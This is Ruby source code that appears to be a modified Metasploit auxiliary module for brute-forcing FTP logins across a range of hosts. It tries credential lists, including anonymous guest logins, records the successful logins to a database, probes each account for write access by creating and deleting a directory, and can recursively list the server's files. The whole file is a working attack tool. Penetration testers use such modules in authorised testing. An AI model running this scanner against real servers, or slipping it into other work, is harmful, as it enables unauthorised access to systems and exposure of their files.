##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/ftp'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def proto
    'ftp'
  end

  def initialize
    super(
      'Name'        => 'FTP Authentication Scanner',
      'Description' => %q{
        This module will test FTP logins on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'      => 'todb',
      'References'     =>
        [
          [ 'CVE', '1999-0502'] # Weak password
        ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(21),
        OptBool.new('ENUM_FILES', [false,'Enumerate files from the FTP server', false]),
        OptInt.new('ENUM_DEPTH', [false,'Controls how many subdirectories to enumerate', 2]),
        OptBool.new('RECORD_GUEST', [ false, "Record anonymous/guest logins to the database", false])
      ], self.class)

    register_advanced_options(
      [
        OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false])
      ]
    )

    deregister_options('FTPUSER','FTPPASS') # Can use these, but should use 'username' and 'password'
    @accepts_all_logins = {}
  end


  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting FTP login sweep")

    cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file: datastore['PASS_FILE'],
        password: datastore['PASSWORD'],
        user_file: datastore['USER_FILE'],
        userpass_file: datastore['USERPASS_FILE'],
        username: datastore['USERNAME'],
        user_as_pass: datastore['USER_AS_PASS'],
        prepended_creds: anonymous_creds
    )

    scanner = Metasploit::Framework::LoginScanner::FTP.new(
        host: ip,
        port: rport,
        proxies: datastore['PROXIES'],
        cred_details: cred_collection,
        stop_on_success: datastore['STOP_ON_SUCCESS'],
        connection_timeout: 30
    )

    service_data = {
        address: ip,
        port: rport,
        service_name: 'ftp',
        protocol: 'tcp',
        workspace_id: myworkspace_id
    }

    scanner.scan! do |result|
      if result.success?

        credential_data = {
            module_fullname: self.fullname,
            origin_type: :service,
            private_data: result.credential.private,
            private_type: :password,
            username: result.credential.public
        }
        credential_data.merge!(service_data)

        credential_core = create_credential(credential_data)

        login_data = {
            access_level: test_ftp_access(result.credential.public, scanner),
            core: credential_core,
            last_attempted_at: DateTime.now,
            status: Metasploit::Model::Login::Status::SUCCESSFUL
        }
        login_data.merge!(service_data)

        create_credential_login(login_data)
        print_good "#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}"

        if datastore['ENUM_FILES']
          enumerate_files(ip, scanner)
        end

      else
        invalidate_login(
            address: ip,
            port: rport,
            protocol: 'tcp',
            public: result.credential.public,
            private: result.credential.private,
            realm_key: nil,
            realm_value: nil,
            status: result.status)
        print_status "#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})"
      end
    end

  end

  def enumerate_files(ip, scanner)
    print_status("#{ip}:#{rport} - Enumerating files")
    
    subdirectories = ['']
    while subdirectories.length > 0
      cwd = scanner.send_cmd_data(['CWD',subdirectories[0]], true)
      pwd = scanner.send_cmd_data(['PWD'], true).scan(/"([^"]*)"/)[0][0]
      if pwd.length == 1
        depth = 0
      elsif pwd.length > 1 and pwd.scan(/\//).length == 1
        depth = 1
      else
        depth = pwd.scan(/\//).length
      end
      if depth > datastore['ENUM_DEPTH']
        return
      else
        response = scanner.send_cmd_data(['LS'], true)
        return if response == nil
        directories = list_directories(response)
        unless directories.empty?
          directories.each do |directory|
            newdir = "#{subdirectories[0]}/#{directory}"
            subdirectories.push("#{newdir}") unless directory == "." or directory == ".."
          end
        end
        files = list_files(response)
        unless files.empty?
          print_good("#{ip}:#{rport} - ftp://#{ip}#{subdirectories[0].gsub("//","/")}/")
          if subdirectories[0].length == 0
            puts "=" * 43
          else
            puts "=" * (43 + subdirectories[0].length)
          end
          files.each do |file|
            puts "#{file}"
          end
          puts
        end
        subdirectories.shift
      end
    end
  end
 
  def list_directories(response)
    directories = []
    if response[1].nil?
      return directories
    else
			puts response
      response[1].split("\r\n").each do |resp|
        # if its a directory store it in array
        if resp[0] == "d" or resp.include? "<DIR>"
          # considers whatever is after the current time (12:12) as directories
          directories << resp[resp.index(/[0-9][0-9]:[0-9][0-9]/)+6..-1] if resp[0] == "d"
					directories << resp[39..-1]
        end
      end
      return directories
    end
  end

  def list_files(response)
    files = []
    if response[1].nil?
      return files
    else
      response[1].split("\r\n").each do |resp|
        # if its a file store it in array
        files << resp
      end
      return files
    end
  end 

  # Always check for anonymous access by pretending to be a browser.
  def anonymous_creds
    anon_creds = [ ]
    if datastore['RECORD_GUEST']
      ['IEUser@', 'User@', 'mozilla@example.com', 'chrome@example.com' ].each do |password|
        anon_creds << Metasploit::Framework::Credential.new(public: 'anonymous', private: password)
      end
    end
    anon_creds
  end

  def test_ftp_access(user,scanner)
    dir = Rex::Text.rand_text_alpha(8)
    write_check = scanner.send_cmd(['MKD', dir], true)
    if write_check and write_check =~ /^2/
      scanner.send_cmd(['RMD',dir], true)
      print_status("#{rhost}:#{rport} - User '#{user}' has READ/WRITE access")
      return 'Read/Write'
    else
      print_status("#{rhost}:#{rport} - User '#{user}' has READ access")
      return 'Read-only'
    end
  end
end
